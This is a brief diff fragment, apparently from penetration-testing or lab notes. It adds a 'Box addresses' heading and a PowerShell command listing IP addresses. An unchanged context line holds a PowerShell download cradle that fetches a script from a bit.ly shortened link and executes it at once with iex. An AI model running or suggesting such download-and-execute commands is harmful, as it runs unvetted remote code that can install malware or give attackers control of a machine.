@@ -14,4 +14,8 @@ iex ((New-Object System.Net.WebClient).DownloadString('https://bit.ly/probuju'))
 
 
 
+Box addresses
 
+```
+(Get-NetIPAddress).IPAddress
+```
